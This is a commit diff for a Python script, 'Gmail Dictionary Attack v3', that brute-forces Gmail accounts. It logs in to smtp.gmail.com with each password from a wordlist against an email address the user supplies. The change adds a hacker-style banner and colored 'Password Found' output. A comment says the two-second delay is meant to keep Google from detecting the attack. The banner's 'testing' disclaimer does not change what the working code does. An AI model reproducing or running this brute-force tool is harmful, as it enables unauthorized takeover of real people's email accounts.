056df819da0aaf8d3967a851726487b7d76e6bfa
C J Lamprecht <coenraadlamprecht@gmail.com>
2017-05-15 23:51:56 +0200

    Update gmail_bforce.py

--- gmail_bforce.py
+++ gmail_bforce.py
@@ -1,13 +1,36 @@
 # Program: Gmail Dictionary Attack v3
 # Author: psibot
-# Purpose: Brute force smtp.gmail.com using a dictionary attack over TLS.
- 
+# Purpose: Brute force smtp.gmail.com using a dictionary attack over TLS. 
+
 import smtplib
 import time 
+from termcolor import colored, cprint
+
+# Colours
+W  = "\033[0m";  
+R  = "\033[31m"; 
+
+
+# Banner
+def logo():
+  print ''
+  cprint('-------------------------------', 'green',attrs=['bold'])
+  print colored('[+]', 'red'), colored('Google Gmail Dictionary Attack V3', 'red')
+  print colored('[+]', 'red'), colored('....Find anything!.....', 'green')
+  cprint('-------------------------------', 'green',attrs=['bold'])
+  print R+"\n|---------------------------------------------------------------|"
+  print "|   d3am0n711[@]gmail[dot]com                                   |"
+  print "|   THIS will be only used for testing                          |"
+  print "|---------------------------------------------------------------|\n"
+  print W
+
+
 smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
 smtpserver.ehlo()
 smtpserver.starttls()
- 
+logo()
+
+
 user = raw_input("Enter the target's email address: ")
 passwfile = raw_input("Enter the password file name: ")
 passwfile = open(passwfile, "r")
@@ -17,7 +40,10 @@ for password in passwfile:
                 time.sleep(2) # Timeout for google not to pickup attack
                 smtpserver.login(user, password)
  
-                print "[+] Password Found: %s" % password
+                print colored('[+]', 'red'), colored(' !!!! Password Found: !!!', 'red')
+                print "It's : %s" % password
                 break;
         except smtplib.SMTPAuthenticationError:
-                print "[!] Password Incorrect: %s" % password
+                print colored('[!]', 'red'), colored('Password Incorrect', 'green') 
+                print ": %s" % password
+
